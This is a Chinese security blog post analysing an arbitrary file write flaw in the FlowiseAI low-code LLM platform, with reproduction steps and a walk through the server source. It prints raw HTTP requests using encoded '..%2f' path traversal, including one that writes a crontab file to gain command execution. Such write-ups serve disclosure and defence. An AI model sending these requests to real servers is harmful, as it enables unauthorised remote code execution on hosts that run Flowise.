#  FlowiseAI 任意文件写入漏洞  
 蚁景网安   2026-03-02 09:12  
  
## 漏洞简介  
  
Flowise是一款与LangChain兼容的开源低代码工具，使普通用户和开发人员都能通过可视化连线方式创建LLM工作流和AI应用。然而该平台存在严重的文件上传漏洞——尽管Flowise实施了上传校验机制，攻击者仍可通过特殊编码绕过限制，实现任意目录的文件写入。这一安全缺陷使未经授权的攻击者能够上传恶意文件、脚本或SSH密钥，从而获取对托管服务器的远程控制权，对使用该平台构建AI代理的组织构成重大安全威胁。  
## 漏洞复现  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WwrsWQsPLoTxqMuaiclT9nR9tV8KSOoYQ3qxzsDFMCCAls1UCnu7WHDQ/640?wx_fmt=other&from=appmsg "")  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WKPTribeON6RuctqiaibuHX9zDvJDGNGcOA1L00fOiaT8Eticyh6ytC7lr4g/640?wx_fmt=other&from=appmsg "")  
  
安装环境后构造上传的数据包  
```
POST /api/v1/attachments/test/test HTTP/1.1
Host: localhost:3000
Accept: application/json, text/plain, */*
x-request-from: internal
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/apikey
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 215

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="test.txt"
Content-Type: text/plain

This is the content of the file.
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WicG21yZSesW07blhw9pUbAVCvwLuuZD2QHyTBGfutQ8LDtCBX3tEqSQ/640?wx_fmt=other&from=appmsg "")  
  
在服务器上查找上传文件的位置  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6W37O1Cia3fALia7CbLEe6c8szDibsBg7PzBeNH365ibcB4NSy8GkIE7J7kg/640?wx_fmt=other&from=appmsg "")  
  
‍  
  
再次构造数据包  
```
POST /api/v1/attachments/..%2ftest/test HTTP/1.1
Host: localhost:3000
Accept: application/json, text/plain, */*
x-request-from: internal
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/apikey
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 215

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="test.txt"
Content-Type: text/plain

This is the content of the file.
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
‍  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WfuI4Fuyr5UdjznYIBm1ic1KH0TwFOgYo3soBTTDzVRhjvlNI4LJbGjA/640?wx_fmt=other&from=appmsg "")  
  
‍  
  
在服务器上再次查找文件位置  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6Wfs4sDBt8ze7YwnAjLIRSfaDmwQPxdeYbbatcGolTTCj0KhR17mJ4eg/640?wx_fmt=other&from=appmsg "")  
  
成功实现跨越目录的上传操作  
  
‍  
  
进一步的进行利用的话 可以通过向定时任务中写入文件实现任意命令执行  
```
POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2fusr/..%2fvar%2fspool%2fcron%2fcrontabs HTTP/1.1
Host: localhost:3000
Accept: application/json, text/plain, */*
x-request-from: internal
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/apikey
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 657

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="root"
Content-Type: text/plain

# do daily/weekly/monthly maintenance
# min   hour    day     month   weekday command
*/15    *       *       *       *       run-parts /etc/periodic/15min
0       *       *       *       *       run-parts /etc/periodic/hourly
0       2       *       *       *       run-parts /etc/periodic/daily
0       3       *       *       6       run-parts /etc/periodic/weekly
0       5       1       *       *       run-parts /etc/periodic/monthly
* * * * * echo "a" >> /tmp/test.txt
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WdmjI8FyKcoLUIag8kgFQaNQeuu5uib7HhDYHrxO1hHeHkn9KnSHm3MQ/640?wx_fmt=other&from=appmsg "")  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WVYKYr7DwHvx1qAYkicm2se94Rib6zg9flE6ONGxvXLgbmk6q4G8yO1gg/640?wx_fmt=other&from=appmsg "")  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WxAp8WGRmJHApiafqgwJpCdkLzSrubu7p4icicaFUfwxxZsNU82D6makew/640?wx_fmt=other&from=appmsg "")  
## 漏洞分析  
  
在Flowise平台的核心架构中，通过constants.ts  
文件定义了一系列无需认证即可访问的API端点，这些端点被归类为WHITELIST_URLS  
。该设计允许特定功能（如API密钥验证、公共聊天流和文件操作等）在未经认证的情况下运行，以提高用户体验和系统灵活性。  
  
Flowise-main/packages/server/src/utils/constants.ts  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6W1uDYConKC7ic78KFPkC9PZ8hsI7cxtPRdgViaiceWzFBjBX3snhJA67rg/640?wx_fmt=other&from=appmsg "")  
  
当服务器接收到新的HTTP请求时，其鉴权流程遵循严格的逻辑顺序：首先检查请求路径是否包含”/api/v1”前缀（不区分大小写）；接着进行大小写敏感的路径验证；随后系统会判断该URL是否存在于预定义的白名单中。若请求路径已被列入白名单，则继续处理；否则，系统会进一步检查请求头中是否包含”internal”标记，或尝试验证API密钥。  
  
Flowise-main/packages/server/src/index.ts  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6W1N6zZ8xrDLgLwsVbES52s3dl2EBQCibwMicvccQ4eO8cEVqdoib3wXqnA/640?wx_fmt=other&from=appmsg "")  
  
‍  
  
Flowise-main/packages/server/src/routes/attachments/index.ts  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WwgdzMqLWiaKS6JcQuWBRpppYWeyibUwzJenrEDyfBLHl0hxdtribI7A4g/640?wx_fmt=other&from=appmsg "")  
  
Flowise-main/packages/server/src/services/attachments/index.ts#createFileAttachment  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WXLhPtgFmM9emkPjRBMv1OgfdxOWSnn4uzSTQ3qdzE2lbXaRo3z0ic8Q/640?wx_fmt=other&from=appmsg "")  
  
/api/v1/attachments/ 路由下存在上传创建文件的操作  
  
Flowise-main/packages/server/src/utils/createAttachment.ts#createFileAttachment  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6WUVganAm8UicmibdavNvAicz0tj29QCfucajBpRXeXia7f0SbEsClJaJsJQ/640?wx_fmt=other&from=appmsg "")  
  
createFileAttachment 中会调用 addArrayFilesToStorage 来对文件进行处理  
  
此时我们也可以看到对应的所有上传路由 /api/v1/attachments/:chatflowId/:chatId  
  
‍  
  
Flowise-main/packages/components/src/storageUtils.ts#addArrayFilesToStorage  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldyc2dKp4yggtaichHRooyh6W8PZyicB1vPiaHQ22cykAy40OSNxQwq0WtQFagovEW7WTU8FBhwNGNJ9g/640?wx_fmt=other&from=appmsg "")  
  
在 addArrayFilesToStorage 中对文件地址进行处理时，会将 chatflowId 和 chatId 未经处理也直接拼接到路径中，所以可以通过编码就直接绕过目录限制实现跨目录的上传  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学  
习  
网安实战课程  
，戳  
“阅读原文”  
  
